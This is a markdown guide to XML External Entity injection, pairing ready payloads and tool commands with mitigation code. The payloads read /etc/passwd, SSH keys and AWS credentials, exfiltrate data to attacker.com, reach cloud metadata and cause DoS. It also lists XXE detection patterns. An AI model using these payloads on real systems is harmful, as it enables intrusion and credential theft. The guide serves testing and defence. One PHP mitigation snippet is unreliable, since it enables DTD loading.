# XML External Entity (XXE) - Comprehensive Guide

## Table of Contents
1. [Introduction](#introduction)
2. [XML Basics & Attack Surface](#xml-basics--attack-surface)
3. [Types of XXE Attacks](#types-of-xxe-attacks)
4. [Detection Techniques](#detection-techniques)
5. [Scanning Tools](#scanning-tools)
6. [Exploitation Scenarios](#exploitation-scenarios)
7. [Advanced Techniques](#advanced-techniques)
8. [Prevention & Mitigation](#prevention--mitigation)

---

## Introduction

XML External Entity (XXE) injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, interact with backend systems, and sometimes escalate to remote code execution.

**Impact**:
- Local file disclosure
- Server-Side Request Forgery (SSRF)
- Denial of Service (DoS)
- Remote Code Execution (rare, specific conditions)
- Port scanning internal networks
- Data exfiltration

**Prerequisites**:
- Application accepts XML input
- XML parser processes external entities
- DTD (Document Type Definition) enabled

---

## XML Basics & Attack Surface

### XML Structure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY name "value">
]>
<root>
  <element>&name;</element>
</root>
```

### Entity Types

**Internal Entity**:
```xml
<!DOCTYPE foo [
  <!ENTITY myEntity "My Value">
]>
<foo>&myEntity;</foo>
```

**External Entity**:
```xml
<!DOCTYPE foo [
  <!ENTITY myEntity SYSTEM "file:///etc/passwd">
]>
<foo>&myEntity;</foo>
```

**Parameter Entity**:
```xml
<!DOCTYPE foo [
  <!ENTITY % myEntity "value">
  %myEntity;
]>
```

### Common Attack Vectors

**API Endpoints**:
```
POST /api/upload
Content-Type: application/xml

POST /api/process
Content-Type: text/xml

SOAP Web Services
REST APIs accepting XML
```

**File Uploads**:
```
- SVG uploads
- DOCX, XLSX (Office Open XML)
- XML sitemaps
- RSS/Atom feeds
- Configuration files
```

**Content-Type Manipulation**:
```
Original: Content-Type: application/json
Changed:  Content-Type: application/xml

Some applications parse both formats
```

---

## Types of XXE Attacks

### 1. Classic XXE (In-Band)

Direct file disclosure where results appear in response.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

**Response**:
```xml
<root>
  <data>root:x:0:0:root:/root:/bin/bash...</data>
</root>
```

### 2. Blind XXE (Out-of-Band)

No direct reflection, exfiltrate data via external requests.

**Basic OOB Detection**:
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-test">
]>
<root>&xxe;</root>
```

**OOB Data Exfiltration**:
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<root></root>
```

**evil.dtd (on attacker server)**:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### 3. Error-Based XXE

Extract data via error messages.

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistentProtocol;://%file;'>">
  %error;
]>
<root>&content;</root>
```

**Error Message**:
```
Error: Unsupported protocol: root:x:0:0:root:/root:/bin/bash
```

### 4. XInclude XXE

When you can't modify DOCTYPE (only data inside XML).

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

### 5. XXE via SVG Upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### 6. XXE via Office Documents

**DOCX structure**:
```
document.docx
├── [Content_Types].xml
├── _rels/
└── word/
    ├── document.xml   ← Inject here
    └── ...
```

**Inject into word/document.xml**:
```xml
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document>
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>
```

---

## Detection Techniques

### Manual Testing

**Step 1: Identify XML Input**
```
- API endpoints accepting XML
- SOAP services
- File uploads (SVG, DOCX, XLSX)
- RSS/Atom feeds
- XML-RPC
- SAML authentication
```

**Step 2: Test for Entity Processing**

**Basic Detection Payload**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY test "XXE_VULNERABLE">
]>
<root>
  <data>&test;</data>
</root>
```

If response contains "XXE_VULNERABLE", entities are processed.

**Step 3: Test External Entity**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>
  <data>&xxe;</data>
</root>
```

**Step 4: Test OOB (if no direct reflection)**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-BURP-COLLABORATOR.burpcollaborator.net">
]>
<root>&xxe;</root>
```

Check Collaborator for DNS/HTTP interaction.

### Automated Detection

**Burp Suite**:
1. Enable Burp Collaborator
2. Send XML request to Scanner
3. Check for XXE vulnerabilities
4. Monitor Collaborator interactions

**Payload Markers**:
```
If response contains file contents: In-band XXE
If Collaborator receives request: OOB XXE
If error reveals data: Error-based XXE
```

---

## Scanning Tools

### 1. XXEinjector

```bash
# Basic file read
ruby XXEinjector.rb --host=192.168.1.100 --path=/etc/passwd --file=request.xml

# HTTP OOB exfiltration
ruby XXEinjector.rb --host=192.168.1.100 --path=/etc/passwd --file=request.xml --oob=http

# FTP OOB exfiltration
ruby XXEinjector.rb --host=192.168.1.100 --path=/etc/passwd --file=request.xml --oob=ftp --ftp=192.168.1.10:21

# PHP filter for base64 encoding
ruby XXEinjector.rb --host=192.168.1.100 --path=index.php --file=request.xml --phpfilter

# Enumerate directories
ruby XXEinjector.rb --host=192.168.1.100 --path=/etc/ --file=request.xml --enumdir

# Port scanning
ruby XXEinjector.rb --host=192.168.1.100 --file=request.xml --enumports=21,22,80,443

# Reverse shell (via expect)
ruby XXEinjector.rb --host=192.168.1.100 --file=request.xml --expect=./shell.sh

# Windows file paths
ruby XXEinjector.rb --host=192.168.1.100 --path="C:\\Windows\\win.ini" --file=request.xml

# Custom DTD
ruby XXEinjector.rb --host=192.168.1.100 --path=/etc/passwd --file=request.xml --dtd=custom.dtd

# Verbose output
ruby XXEinjector.rb --host=192.168.1.100 --path=/etc/passwd --file=request.xml --verbose

# request.xml format:
# Place XXEINJECT where entity should be injected
```

### 2. Burp Suite

**Active Scanning**:
- Automatically tests for XXE
- Uses Collaborator for OOB detection
- Tests various entity types

**Manual Testing (Repeater)**:
1. Send XML request to Repeater
2. Modify XML to include XXE payload
3. Send request
4. Analyze response

**Extensions**:
- **XXE Injector**: Automated XXE testing
- **Content Type Converter**: Convert JSON to XML
- **Collaborator Everywhere**: Inject Collaborator payloads

### 3. OWASP ZAP

```bash
# Active scan
zap-cli active-scan https://target.com/api

# Passive scan (detects XML inputs)
zap-cli quick-scan https://target.com
```

**Manual Testing**:
1. Intercept XML request
2. Right-click → Active Scan
3. ZAP tests for XXE variants

### 4. Nuclei

```bash
# Run XXE templates
nuclei -u https://target.com -t xxe/

# Specific template
nuclei -u https://target.com -t nuclei-templates/vulnerabilities/xxe/

# Custom list
nuclei -l urls.txt -t xxe/

# Verbose output
nuclei -u https://target.com -t xxe/ -v
```

### 5. Manual Tools

**curl**:
```bash
# Send XXE payload
curl -X POST https://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Test OOB
curl -X POST https://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://burp-collab.com">]><root>&xxe;</root>'
```

**Python Script**:
```python
import requests

xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>'''

headers = {'Content-Type': 'application/xml'}
r = requests.post('https://target.com/api', data=xxe_payload, headers=headers)

if 'root:' in r.text:
    print('[+] XXE Vulnerable!')
    print(r.text)
```

### 6. Specialized Tools

**oxml_xxe** (Office document XXE):
```bash
# Create malicious DOCX
python oxml_xxe.py --input document.docx --output evil.docx --payload 'file:///etc/passwd'

# Upload evil.docx to target
# View document to see exfiltrated data
```

**SVG XXE Generator**:
```bash
# Generate malicious SVG
echo '<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>' > evil.svg
```

---

## Exploitation Scenarios

### Scenario 1: File Disclosure

```xml
<!-- /etc/passwd -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Windows hosts file -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]>
<root>&xxe;</root>

<!-- Application config -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/.env">]>
<root>&xxe;</root>

<!-- AWS credentials -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.aws/credentials">]>
<root>&xxe;</root>

<!-- SSH private key -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]>
<root>&xxe;</root>
```

### Scenario 2: SSRF via XXE

```xml
<!-- Scan internal network -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1">]>
<root>&xxe;</root>

<!-- Access cloud metadata -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root>&xxe;</root>

<!-- Interact with internal service -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/admin">]>
<root>&xxe;</root>

<!-- Port scan -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server:22">]>
<root>&xxe;</root>
<!-- Repeat for different ports, observe timing/errors -->
```

### Scenario 3: Blind XXE with OOB Exfiltration

**Attack XML**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<root></root>
```

**evil.dtd (hosted on attacker server)**:
```xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8000/?data=%file;'>">
%all;
```

**Attacker receives**:
```
GET /?data=root:x:0:0:root:/root:/bin/bash... HTTP/1.1
```

### Scenario 4: PHP Filter for Source Code

```xml
<!-- Read PHP source without execution -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>

<!-- Response contains base64 encoded source -->
<!-- Decode: echo "PD9waHA..." | base64 -d -->
```

### Scenario 5: Parameter Entity Injection

```xml
<!-- When external DTD blocked, use parameter entities -->
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%data;'>">
  %eval;
  %exfil;
]>
<foo></foo>
```

### Scenario 6: Denial of Service (Billion Laughs)

```xml
<!-- Exponential entity expansion -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

<!-- Expands to 10^9 "lol" strings, consuming massive memory -->
```

---

## Advanced Techniques

### 1. UTF-7 Encoding Bypass

```xml
<!-- If parser converts UTF-7 -->
+ADw-!DOCTYPE foo [+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-]+AD4-
```

### 2. XInclude when DOCTYPE Blocked

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <data>
    <xi:include parse="text" href="file:///etc/passwd"/>
  </data>
</root>
```

### 3. SOAP XXE

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <soap:Body>
    <foo>&xxe;</foo>
  </soap:Body>
</soap:Envelope>
```

### 4. XXE in JSON Applications

**Convert JSON to XML**:
```
Original: Content-Type: application/json
Test: Content-Type: application/xml

Original body:
{"user": "admin"}

Convert to:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><user>&xxe;</user></root>
```

### 5. Multi-Step OOB Exfiltration

**For large files or special characters**:

```xml
<!-- Step 1: Read file -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
```

**evil.dtd**:
```xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:2121/?%file;'>">
%all;
```

**Receive via FTP** (handles special characters better):
```bash
# Listen on FTP port
python -m pyftpdlib -p 2121
```

### 6. Error-Based Character Enumeration

```xml
<!-- Extract data character by character via errors -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % start "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %start;
  %error;
]>
```

---

## Prevention & Mitigation

### 1. Disable External Entity Processing

**PHP (libxml)**:
```php
// Disable external entities
libxml_disable_entity_loader(true);

// Or use LIBXML_NOENT cautiously
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_DTDLOAD | LIBXML_DTDATTR);
```

**Python (defusedxml)**:
```python
# DON'T use standard libraries
import xml.etree.ElementTree as ET  # VULNERABLE

# USE defusedxml
from defusedxml import ElementTree as ET
tree = ET.parse('file.xml')
```

**Java**:
```java
// Disable DTDs completely
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Disable external entities
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// Disable XInclude
dbf.setXIncludeAware(false);

// Disable entity expansion
dbf.setExpandEntityReferences(false);
```

**.NET**:
```csharp
// Set secure resolver
XmlReaderSettings settings = new XmlReaderSettings();
settings.ProhibitDtd = true;  // .NET 4.0
settings.DtdProcessing = DtdProcessing.Prohibit;  // .NET 4.5.2+
settings.XmlResolver = null;

XmlReader reader = XmlReader.Create(stream, settings);
```

### 2. Use Simple Data Formats

```
Prefer JSON over XML when possible
- No DTD processing
- No entity expansion
- Simpler parsing

If XML required:
- Use minimal XML (no DTD)
- Validate against strict schema
- Whitelist allowed elements
```

### 3. Input Validation

```php
// Reject XML with DOCTYPE
if (preg_match('/<!DOCTYPE/i', $xml)) {
    die('DTD not allowed');
}

// Reject ENTITY declarations
if (preg_match('/<!ENTITY/i', $xml)) {
    die('Entities not allowed');
}

// Reject SYSTEM keyword
if (preg_match('/SYSTEM/i', $xml)) {
    die('SYSTEM not allowed');
}
```

### 4. Patch and Update

```bash
# Keep XML libraries updated
# PHP libxml2
# Java Xerces
# Python lxml, defusedxml
# .NET System.Xml

# Check for CVEs
# Subscribe to security advisories
```

### 5. Web Application Firewall

```
ModSecurity rules for XXE:
- Detect <!DOCTYPE
- Detect <!ENTITY
- Detect SYSTEM
- Detect file:/// protocol
- Detect http:// in entities
```

### 6. Least Privilege

```bash
# Application user should not have access to sensitive files
chmod 600 /etc/shadow
chown root:root /etc/passwd

# Application runs as www-data
# www-data cannot read /etc/shadow
```

### 7. Network Segmentation

```
- Application server in DMZ
- Database/internal services in private network
- Firewall rules prevent outbound requests from app
- Block access to metadata endpoints (169.254.169.254)
```

### Security Checklist

- [ ] External entity processing disabled
- [ ] DTD processing disabled
- [ ] Using secure XML libraries (defusedxml, etc.)
- [ ] Input validation rejects DOCTYPE
- [ ] WAF rules for XXE detection
- [ ] File permissions restrict sensitive files
- [ ] Outbound requests from app server restricted
- [ ] Regular security updates
- [ ] Automated XXE scanning in CI/CD
- [ ] Security code review for XML processing

---

**Additional Resources**:
- OWASP XXE Prevention Cheat Sheet
- PortSwigger XXE Tutorial
- HackTricks - XXE Injection
- PayloadsAllTheThings - XXE
